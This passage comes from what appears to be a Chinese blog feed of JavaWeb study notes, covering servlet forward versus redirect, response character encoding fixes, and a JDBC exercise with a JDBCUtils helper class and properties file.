class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>运行结果<br><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">dem<span class="meta">o1</span>被访问了</span><br><span class="line">dem<span class="meta">o2</span>被访问了</span><br></pre></td></tr></table></figure></p>
<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul>
<li><p>转发的特点：</p>
<ol>
<li><p>转发地址栏路径不变</p>
</li>
<li><p>转发只能访问当前服务器下的资源</p>
</li>
<li><p>转发是一次请求,可以使用request对象共享数据</p>
</li>
</ol>
</li>
<li><p>重定向的特点</p>
<ol>
<li><p>地址栏发生变化</p>
</li>
<li><p>重定向可以访问其他站点(服务器)的资源</p>
</li>
<li><p>重定向是两次请求,不能使用request对象来共享数据</p>
</li>
</ol>
</li>
</ul>
<h3 id="服务器输出字符数据到浏览器"><a href="#服务器输出字符数据到浏览器" class="headerlink" title="服务器输出字符数据到浏览器"></a>服务器输出字符数据到浏览器</h3><ul>
<li><p>步骤：</p>
<ol>
<li><p>获取字符输出流</p>
</li>
<li><p>输出数据</p>
</li>
</ol>
</li>
</ul>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">PrintWriter</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">demo3</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//1.获取字符输出流</span></span><br><span class="line">        <span class="type">PrintWriter</span> pw = response.getWriter();</span><br><span class="line">        <span class="comment">//2.输出数据</span></span><br><span class="line">        pw.write(<span class="string">"hello response"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果在浏览器上输出<br><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hello response</span></span><br></pre></td></tr></table></figure></p>
<h4 id="中文乱码"><a href="#中文乱码" class="headerlink" title="中文乱码"></a>中文乱码</h4><p>乱码原因：编解码使用的字符集不一致</p>
<p>例如知道服务器用的是GBK编码，那就改为<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">PrintWriter</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">demo3</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//获取流对象之前，设置流的编码</span></span><br><span class="line">        response.setCharacterEncoding(<span class="string">"GBK"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取字符输出流</span></span><br><span class="line">        <span class="type">PrintWriter</span> pw = response.getWriter();</span><br><span class="line">        <span class="comment">//2.输出数据</span></span><br><span class="line"><span class="comment">//        pw.write("hello response");</span></span><br><span class="line">          pw.write(<span class="string">"你好 response"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>就可以正常显示了</p>
<p>但是往往会有兼容性问题，如果服务器为UTF-8，而我们又不知道，还是会出现乱码问题</p>
<p>所以我们可以告诉浏览器，我们采用何种编码<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.web.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">PrintWriter</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">demo3</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//获取流对象之前，设置流的编码</span></span><br><span class="line">        response.setCharacterEncoding(<span class="string">"utf-8"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//告诉浏览器，服务器发送的消息体数据的编码，建议浏览器使用该编码解码</span></span><br><span class="line">        <span class="comment">//response.setHeader("content-type","text/html;charset=utf-8");</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//简单的形式来设置编码</span></span><br><span class="line">        response.setContentType(<span class="string">"text/html;charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取字符输出流</span></span><br><span class="line">        <span class="type">PrintWriter</span> pw = response.getWriter();</span><br><span class="line">        <span class="comment">//2.输出数据</span></span><br><span class="line"><span class="comment">//        pw.write("hello response");</span></span><br><span class="line">          pw.write(<span class="string">"你好 response"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>设置流的编码也可以不写，setHeader就可以了</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-2020/7/28-JDBC与数据库连接池</title>
    <url>/2020/07/28/JavaWeb-2020-7-28-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h1><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>myguests表：</p>
<p><img src="/img/JavaWeb/7-28学习日记/0.png" alt="avatar"></p>
<p><img src="/img/JavaWeb/7-28学习日记/1.png" alt="avatar"></p>
<ul>
<li><p>定义一个方法，查询myguests表的数据将其封装为对象。然后装载集合，返回</p>
<ol>
<li><p>定义一个Myguests类</p>
</li>
<li><p>定义方法public List<Myguests> findAll(){}</p>
</li>
<li>实现方法 select * from Myguests</li>
</ol>
</li>
</ul>
<p>创建一个Myguests类<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package jdbc.test;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 封装Myguests表数据的JavaBean</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Myguests</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> firstname;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> lastname;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> email;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getFirstname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> firstname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFirstname</span><span class="params">(<span class="keyword">String</span> firstname)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.firstname = firstname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getLastname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> lastname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLastname</span><span class="params">(<span class="keyword">String</span> lastname)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.lastname = lastname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getEmail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmail</span><span class="params">(<span class="keyword">String</span> email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Myguests&#123;"</span> +</span><br><span class="line">                <span class="string">"id="</span> + id +</span><br><span class="line">                <span class="string">", firstname='"</span> + firstname + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", lastname='"</span> + lastname + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", email='"</span> + email + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>创建demo8<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">package jdbc;</span><br><span class="line"></span><br><span class="line">import jdbc.test.Myguests;</span><br><span class="line"></span><br><span class="line">import java.sql.*;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> demo8 &#123;</span><br><span class="line">    public List&lt;Myguests&gt; find<span class="constructor">All()</span> &#123;</span><br><span class="line">        Connection conn=null;</span><br><span class="line">        Statement stmt=null;</span><br><span class="line">        ResultSet rs=null;</span><br><span class="line">        List&lt;Myguests&gt; <span class="built_in">list</span>=null;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//1.注册驱动</span></span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"com.mysql.cj.jdbc.Driver"</span>)</span>;</span><br><span class="line">            <span class="comment">//2.获取连接对象</span></span><br><span class="line">            conn=<span class="module-access"><span class="module"><span class="identifier">DriverManager</span>.</span></span>get<span class="constructor">Connection(<span class="string">"jdbc:mysql://localhost:3306/mydb?useSSL=false&amp;serverTimezone=GMT%2B8"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>)</span>;</span><br><span class="line">            <span class="comment">//3.sql语句</span></span><br><span class="line">            String sql=<span class="string">"select * from myguests"</span>;</span><br><span class="line">            <span class="comment">//4.获取执行sql对象</span></span><br><span class="line">            stmt=conn.prepare<span class="constructor">Statement(<span class="params">sql</span>)</span>;</span><br><span class="line">            <span class="comment">//5.执行sql</span></span><br><span class="line">            rs=stmt.execute<span class="constructor">Query(<span class="params">sql</span>)</span>;</span><br><span class="line">            <span class="comment">//6.遍历结果集，封装对象，装载集合</span></span><br><span class="line">            Myguests myguests=null;</span><br><span class="line">            <span class="built_in">list</span> = <span class="keyword">new</span> ArrayList&lt;Myguests&gt;<span class="literal">()</span>;</span><br><span class="line">            <span class="keyword">while</span>(rs.next<span class="literal">()</span>)&#123;</span><br><span class="line">                <span class="comment">//获取数据</span></span><br><span class="line">                <span class="built_in">int</span> id=rs.get<span class="constructor">Int(<span class="string">"id"</span>)</span>;</span><br><span class="line">                String fristname=rs.get<span class="constructor">String(<span class="string">"firstname"</span>)</span>;</span><br><span class="line">                String lastname = rs.get<span class="constructor">String(<span class="string">"lastname"</span>)</span>;</span><br><span class="line">                String email = rs.get<span class="constructor">String(<span class="string">"email"</span>)</span>;</span><br><span class="line">                <span class="comment">//创建对象,并赋值</span></span><br><span class="line">                myguests=<span class="keyword">new</span> <span class="constructor">Myguests()</span>;</span><br><span class="line">                myguests.set<span class="constructor">Id(<span class="params">id</span>)</span>;</span><br><span class="line">                myguests.set<span class="constructor">Firstname(<span class="params">fristname</span>)</span>;</span><br><span class="line">                myguests.set<span class="constructor">Lastname(<span class="params">lastname</span>)</span>;</span><br><span class="line">                myguests.set<span class="constructor">Email(<span class="params">email</span>)</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//装载集合</span></span><br><span class="line">                <span class="built_in">list</span>.add(myguests);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;catch (ClassNotFoundException e)&#123;</span><br><span class="line">            e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">        &#125;catch (SQLException e)&#123;</span><br><span class="line">            e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">        &#125;finally &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rs!=null)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    rs.close<span class="literal">()</span>;</span><br><span class="line">                &#125;catch (SQLException e)&#123;</span><br><span class="line">                    e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (stmt!=null)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    stmt.close<span class="literal">()</span>;</span><br><span class="line">                &#125;catch (SQLException e)&#123;</span><br><span class="line">                    e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (conn!=null)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    conn.close<span class="literal">()</span>;</span><br><span class="line">                &#125;catch (SQLException e)&#123;</span><br><span class="line">                    e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        return <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String<span class="literal">[]</span> args) &#123;</span><br><span class="line">        List&lt;Myguests&gt; <span class="built_in">list</span> = <span class="keyword">new</span> demo8<span class="literal">()</span>.find<span class="constructor">All()</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="built_in">list</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[Myguests&#123;<span class="attribute">id</span>=1, <span class="attribute">firstname</span>=<span class="string">'John'</span>, <span class="attribute">lastname</span>=<span class="string">'Doe'</span>, <span class="attribute">email</span>=<span class="string">'john@example.com'</span>&#125;, Myguests&#123;<span class="attribute">id</span>=2, <span class="attribute">firstname</span>=<span class="string">'John'</span>, <span class="attribute">lastname</span>=<span class="string">'Doe'</span>, <span class="attribute">email</span>=<span class="string">'john@example.com'</span>&#125;, Myguests&#123;<span class="attribute">id</span>=3, <span class="attribute">firstname</span>=<span class="string">'Mary'</span>, <span class="attribute">lastname</span>=<span class="string">'Moe'</span>, <span class="attribute">email</span>=<span class="string">'mary@example.com'</span>&#125;, Myguests&#123;<span class="attribute">id</span>=4, <span class="attribute">firstname</span>=<span class="string">'Julie'</span>, <span class="attribute">lastname</span>=<span class="string">'Dooley'</span>, <span class="attribute">email</span>=<span class="string">'julie@example.com'</span>&#125;, Myguests&#123;<span class="attribute">id</span>=5, <span class="attribute">firstname</span>=<span class="string">'John'</span>, <span class="attribute">lastname</span>=<span class="string">'Doe'</span>, <span class="attribute">email</span>=<span class="string">'john@example.com'</span>&#125;, Myguests&#123;<span class="attribute">id</span>=6, <span class="attribute">firstname</span>=<span class="string">'Mary'</span>, <span class="attribute">lastname</span>=<span class="string">'Moe'</span>, <span class="attribute">email</span>=<span class="string">'mary@example.com'</span>&#125;, Myguests&#123;<span class="attribute">id</span>=7, <span class="attribute">firstname</span>=<span class="string">'Julie'</span>, <span class="attribute">lastname</span>=<span class="string">'Dooley'</span>, <span class="attribute">email</span>=<span class="string">'julie@example.com'</span>&#125;]</span><br></pre></td></tr></table></figure></p>
<h2 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h2><ul>
<li><p>目的：简化书写</p>
</li>
<li><p>分析：</p>
<ol>
<li><p>注册驱动也抽取</p>
</li>
<li><p>抽取一个方法获取连接对象</p>
<ul>
<li><p>需求：不想传递参数，还得保证工具类的通用性</p>
</li>
<li><p>解决方案：配置文件</p>
</li>
</ul>
</li>
<li><p>抽取一个方法释放资源</p>
</li>
</ol>
</li>
</ul>
<p>创建JDBCUtils<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package jdbc.until;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JDBC工具类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDBCUtils</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">String</span> url;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">String</span> user;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">String</span> password;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">String</span> driver;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 文件的读取只需要读取一次即可拿到这些值，使用静态代码块</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="comment">//读取资源文件，获取值</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//1.创建Properties集合类</span></span><br><span class="line">            Properties pro=<span class="keyword">new</span> Properties();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//2.加载文件</span></span><br><span class="line">            pro.load(<span class="keyword">new</span> FileReader(<span class="string">"src/main/java/jdbc.properties"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.获取数据，赋值</span></span><br><span class="line">            url=pro.getProperty(<span class="string">"url"</span>);</span><br><span class="line">            user=pro.getProperty(<span class="string">"user"</span>);</span><br><span class="line">            password=pro.getProperty(<span class="string">"password"</span>);</span><br><span class="line">            driver=pro.getProperty(<span class="string">"driver"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.注册驱动</span></span><br><span class="line">            Class.forName(driver);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取链接</span></span><br><span class="line"><span class="comment">     * @return 连接对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span> throws SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> DriverManager.getConnection(url,user,password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 释放资源</span></span><br><span class="line"><span class="comment">     * @param stmt</span></span><br><span class="line"><span class="comment">     * @param conn</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">(Statement stmt,Connection conn)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stmt!=null)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                stmt.<span class="built_in">close</span>();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(conn!=null)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                conn.<span class="built_in">close</span>();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">(ResultSet rs,Statement stmt,Connection conn)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(rs!=null)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                rs.<span class="built_in">close</span>();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(stmt!=null)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                stmt.<span class="built_in">close</span>();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(conn!=null)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                conn.<span class="built_in">close</span>();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>配置文件<br><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">url=jdbc:mysql://localhost:<span class="number">3306</span>/mydb?useSSL=<span class="literal">false</span>&amp;serverTimezone=GMT%<span class="number">2B8</span></span><br><span class="line">user=root</span><br><span class="line">password=root</span><br><span class="line">driver=com.mysql.cj.jdbc.Driver</span><br></pre></td></tr></table></figure></p>
<p>修改demo8中的findAll()方法<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">package jdbc;</span><br><span class="line"></span><br><span class="line">import jdbc.test.Myguests;</span><br><span class="line">import jdbc.until.JDBCUtils;</span><br><span class="line"></span><br><span class="line">import java.sql.*;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> demo8 &#123;</span><br><span class="line">    public List&lt;Myguests&gt; find<span class="constructor">All()</span> &#123;</span><br><span class="line">        Connection conn=null;</span><br><span class="line">        Statement stmt=null;</span><br><span class="line">        ResultSet rs=null;</span><br><span class="line">        List&lt;Myguests&gt; <span class="built_in">list</span>=null;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//1.注册驱动</span></span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"com.mysql.cj.jdbc.Driver"</span>)</span>;</span><br><span class="line">            <span class="comment">//2.获取连接对象</span></span><br><span class="line">            conn=<span class="module-access"><span class="module"><span class="identifier">DriverManager</span>.</span></span>get<span class="constructor">Connection(<span class="string">"jdbc:mysql://localhost:3306/mydb?useSSL=false&amp;serverTimezone=GMT%2B8"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>)</span>;</span><br><span class="line">            <span class="comment">//3.sql语句</span></span><br><span class="line">            String sql=<span class="string">"select * from myguests"</span>;</span><br><span class="line">            <span class="comment">//4.获取执行sql对象</span></span><br><span class="line">            stmt=conn.prepare<span class="constructor">Statement(<span class="params">sql</span>)</span>;</span><br><span class="line">            <span class="comment">//5.执行sql</span></span><br><span class="line">            rs=stmt.execute<span class="constructor">Query(<span class="params">sql</span>)</span>;</span><br><span class="line">            <span class="comment">//6.遍历结果集，封装对象，装载集合</span></span><br><span class="line">            Myguests myguests=null;</span><br><span class="line">            <span class="built_in">list</span> = <span class="keyword">new</span> ArrayList&lt;Myguests&gt;<span class="literal">()</span>;</span><br><span class="line">            <span class="keyword">while</span>(rs.next<span class="literal">()</span>)&#123;</span><br><span class="line">                <span class="comment">//获取数据</span></span><br><span class="line">                <span class="built_in">int</span> id=rs.get<span class="constructor">Int(<span class="string">"id"</span>)</span>;</span><br><span class="line">                String fristname=rs.get<span class="constructor">String(<span class="string">"firstname"</span>)</span>;</span><br><span class="line">                String lastname = rs.get<span class="constructor">String(<span class="string">"lastname"</span>)</span>;</span><br><span class="line">                String email = rs.get<span class="constructor">String(<span class="string">"email"</span>)</span>;</span><br><span class="line">                <span class="comment">//创建对象,并赋值</span></span><br><span class="line">                myguests=<span class="keyword">new</span> <span class="constructor">Myguests()</span>;</span><br><span class="line">                myguests.set<span class="constructor">Id(<span class="params">id</span>)</span>;</span><br><span class="line">                myguests.set<span class="constructor">Firstname(<span class="params">fristname</span>)</span>;</span><br><span class="line">                myguests.set<span class="constructor">Lastname(<span class="params">lastname</span>)</span>;</span><br><span class="line">                myguests.set<span class="constructor">Email(<span class="params">email</span>)</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//装载集合</span></span><br><span class="line">                <span class="built_in">list</span>.add(myguests);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;catch (ClassNotFoundException e)&#123;</span><br><span class="line">            e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">        &#125;catch (SQLException e)&#123;</span><br><span class="line">            e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">        &#125;finally &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rs!=null)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    rs.close<span class="literal">()</span>;</span><br><span class="line">                &#125;catch (SQLException e)&#123;</span><br><span class="line">                    e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> 